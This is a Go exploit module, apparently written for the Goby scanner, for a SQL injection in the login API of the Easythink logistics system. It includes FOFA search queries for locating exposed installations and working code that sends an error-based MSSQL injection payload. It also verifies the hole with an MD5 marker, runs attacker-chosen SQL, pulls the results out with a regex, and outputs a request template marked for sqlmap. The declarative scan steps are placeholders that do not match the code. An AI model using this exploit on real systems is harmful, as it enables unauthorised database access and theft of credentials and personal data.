package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Easythink Intelligent Logistics Unattended System /api/PhoneLogin/login SQL Injection Vulnerability",
    "Description": "<p>Easythink Unattended Intelligent Logistics System is an innovative product that integrates artificial intelligence, robotics and IoT technologies. It can autonomously complete logistics operations such as cargo storage, retrieval, sorting, loading and distribution, helping enterprises to achieve unattended intelligent logistics operations, improve efficiency, reduce costs, and bring new development opportunities to the modern logistics industry. The system aims to provide process manufacturing companies with a unified intelligent information platform for raw material procurement, finished product sales and in-plant logistics. Through the integrated management of the production, supply and marketing business of the entire enterprise, it can achieve unattended measurement, reduce costs and increase efficiency, replace manual labor with machines, and optimize the logistics resource management and control system.</p>",
    "Product": "Easythink Unmanned Intelligent Logistics System‌",
    "Homepage": "http://www.eosine.com.cn/",
    "DisclosureDate": "2024-11-04",
    "PostTime": "2024-11-05",
    "Author": "1251220046@qq.com",
    "FofaQuery": "body=\"Content/styles/iconfont.css\" || body=\"智能物流无人值守系统\" || body=\"/Content/styles/loginindex.css\"",
    "GobyQuery": "body=\"Content/styles/iconfont.css\" || body=\"智能物流无人值守系统\" || body=\"/Content/styles/loginindex.css\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtaininformation in the database (for example, theadministrator's back-end password, the user's personalinformation of the site), an attacker can write a Trojanhorse to the server even in a high-privileged situation tofurther obtain server system permissions.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. </p><p>2. If not necessary, prohibit the public from accessing the system.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/143490345?spm=1001.2014.3001.5501"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "@@version",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "易思智能物流无人值守系统 /api/PhoneLogin/login SQL 注入漏洞",
            "Product": "易思-智能物流无人值守系统",
            "Description": "<p>易思无人值守智能物流系统‌是一款集成了人工智能、机器人技术和物联网技术的创新产品。它能够自主完成货物存储、检索、分拣、装载以及配送等物流作业，帮助企业实现无人值守的智能物流运营，提高效率、降低成本，为现代物流行业带来新的发展机遇。该系统旨在为流程生产企业提供原料采购、产成品销售及厂内物流的统一管控智能信息化平台，通过全企业产供销业务的集成管理，实现无人值守计量、降本增效、机器替代人工，优化物流资源管控体系。<br></p>",
            "Recommendation": "<p>1、部署Web应⽤防⽕墙，对数据库操作进⾏监控。&nbsp;&nbsp;<br></p><p>2、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Easythink Intelligent Logistics Unattended System /api/PhoneLogin/login SQL Injection Vulnerability",
            "Product": "Easythink Unmanned Intelligent Logistics System‌",
            "Description": "<p>Easythink Unattended Intelligent Logistics System is an innovative product that integrates artificial intelligence, robotics and IoT technologies. It can autonomously complete logistics operations such as cargo storage, retrieval, sorting, loading and distribution, helping enterprises to achieve unattended intelligent logistics operations, improve efficiency, reduce costs, and bring new development opportunities to the modern logistics industry. The system aims to provide process manufacturing companies with a unified intelligent information platform for raw material procurement, finished product sales and in-plant logistics. Through the integrated management of the production, supply and marketing business of the entire enterprise, it can achieve unattended measurement, reduce costs and increase efficiency, replace manual labor with machines, and optimize the logistics resource management and control system.<br></p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.&nbsp;<br></p><p>2. If not necessary, prohibit the public from accessing the system.<br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtaininformation in the database (for example, theadministrator's back-end password, the user's personalinformation of the site), an attacker can write a Trojanhorse to the server even in a high-privileged situation tofurther obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`

	setSqlPayloadhrwFVs5Bk4 := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		defineHeader := map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
		}

		rawPayload := fmt.Sprintf("1' AND 8434 IN (SELECT ((SELECT %s)))-- aNDC", sql)
		postData := fmt.Sprintln("Account=" + url.QueryEscape(rawPayload) + "&Espassword=g5edid4OCFI32C5NPEZeXg==")
		urlGet := "/api/PhoneLogin/login"

		resp, err = setPostRequest(hostInfo, urlGet, postData, defineHeader)
		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil || resp.StatusCode != 200 {
			return resp, "", errors.New("Fail")
		}
		//配置漏洞存在的路径
		vulurl = "/api/PhoneLogin/login"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			MD5Reslut := rand.Intn(99999)
			MD5ResultStr := fmt.Sprintf("%d", MD5Reslut)
			//将MD5Hash进行md5加密
			MD5Hash := md5.New()
			MD5Hash.Write([]byte(MD5ResultStr))
			hashBytes := MD5Hash.Sum(nil)
			// 将MD5哈希值转换为十六进制字符串，并取前16个字符
			content := hex.EncodeToString(hashBytes)[:16]

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := fmt.Sprintf("sys.fn_sqlvarbasetostr(HashBytes('MD5','%s'))", MD5ResultStr)

			//// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			//regular := `SQL Server`
			//
			//makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
			//	reRequest := regexp.MustCompile(RegularUrl)
			//	if !reRequest.MatchString(RegularContent) {
			//		return "", fmt.Errorf("can't match value")
			//	}
			//	getname := reRequest.FindStringSubmatch(RegularContent)
			//	return getname[1], nil
			//}

			sendPayload := setSqlPayloadhrwFVs5Bk4
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}

			if !strings.Contains(resp.RawBody, content) {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "POST /api/PhoneLogin/login HTTP/1.1\nHost: " + expResult.HostInfo.HostInfo + "\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip\n \nAccount=1'*&Espassword=g5edid4OCFI32C5NPEZeXg%3D%3D\n"

			// 3.配置正则语句，从响应包中提取出数据
			regular := `Entity mapping error.在将 nvarchar 值 '([^'"]+)'`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}

			sendPayload := setSqlPayloadhrwFVs5Bk4
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "default" || attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
				return expResult
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
